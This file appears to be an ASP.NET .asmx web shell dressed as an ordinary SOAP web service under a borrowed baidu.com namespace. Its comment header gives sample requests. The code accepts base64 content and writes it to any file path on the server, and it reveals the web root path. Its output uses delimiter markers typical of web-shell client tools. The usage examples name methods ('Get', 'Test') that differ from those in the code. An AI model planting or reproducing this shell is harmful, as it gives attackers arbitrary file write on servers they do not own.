<%--
Usage:


POST /writefile.asmx HTTP/1.1
Host: Host
Content-Type: text/xml; charset=utf-8
Content-Length: 301
SOAPAction: "http://www.baidu.com/Get"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Get xmlns="http://www.baidu.com/" />
  </soap:Body>
</soap:Envelope>


POST /writefile.asmx HTTP/1.1
Host: Host
Content-Type: text/xml; charset=utf-8
Content-Length: 367
SOAPAction: "http://www.baidu.com/Write"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Test xmlns="http://www.baidu.com/">
      <Z1>c3RyaW5n</Z1>
      <Z2>C:\www\2.log</Z2>
    </Test>
  </soap:Body>
</soap:Envelope>

--%>

<%@ WebService Language="C#" Class="Service" %>
using System;
using System.Web;
using System.IO;
using System.Net;
using System.Text;
using System.Data;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Diagnostics;
using System.Web.SessionState;
using System.Web.Services;
using System.Xml;
using System.Web.Services.Protocols;

[WebService(Namespace = "http://www.baidu.com/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

public class Service : System.Web.Services.WebService
{
    public Service()
    {

    }

    [WebMethod]
    public string Write(string Z1,string Z2)
    {
        String R;
        byte[] bs = Convert.FromBase64String(Z1);
        string content = System.Text.Encoding.UTF8.GetString(bs); 
        StreamWriter file1= File.CreateText(Z2); 
        file1.Write(content); 
        file1.Flush(); 
        file1.Close(); 
        R = HttpContext.Current.Server.MapPath("/");
        HttpContext.Current.Response.Clear();
        HttpContext.Current.Response.Write("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
        HttpContext.Current.Response.Write("<data>");
        HttpContext.Current.Response.Write("<![CDATA[");
        HttpContext.Current.Response.Write("\x2D\x3E\x7C");
        HttpContext.Current.Response.Write(R);
        HttpContext.Current.Response.Write("\x7C\x3C\x2D");
        HttpContext.Current.Response.Write("]]>");
        HttpContext.Current.Response.Write("</data>");
        HttpContext.Current.Response.End();
        return R;
    }
    
    [WebMethod]
    public string GetPath()
    {
        String R;
        R = HttpContext.Current.Server.MapPath("/");
        HttpContext.Current.Response.Clear();
        HttpContext.Current.Response.Write("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
        HttpContext.Current.Response.Write("<data>");
        HttpContext.Current.Response.Write("<![CDATA[");
        HttpContext.Current.Response.Write("\x2D\x3E\x7C");
        HttpContext.Current.Response.Write(R);
        HttpContext.Current.Response.Write("\x7C\x3C\x2D");
        HttpContext.Current.Response.Write("]]>");
        HttpContext.Current.Response.Write("</data>");
        HttpContext.Current.Response.End();
        return R;
    }
    
}
